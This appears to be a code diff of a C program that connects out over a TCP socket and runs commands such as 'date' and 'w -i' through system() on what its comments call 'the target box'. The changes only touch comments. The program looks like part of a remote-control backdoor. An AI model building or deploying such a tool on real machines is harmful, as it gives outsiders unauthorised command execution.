@@ -63,7 +63,7 @@ int main(int argc, char *argv[])
 
 	sock = socket(AF_INET, SOCK_STREAM, 0);	//sets up our socket descripter
 
-//	printf("Socket descripter value: %d\n", sock); //this is some file descriptor testing
+	//printf("Socket descripter value: %d\n", sock); //this is some file descriptor testing
 
 	int check = connect(sock, (struct sockaddr *)&sa, sizeof(sa));	//attempt to connect
 
@@ -160,7 +160,7 @@ int main(int argc, char *argv[])
 			}
 
 			else if(!strcmp("date", command))
-				system("date");
+				system("date");		//display date/time information on the target box
 
 			else if(!strcmp("who", command))
 				system("w -i");		//display the current users with ip address as the from instead of hostnames
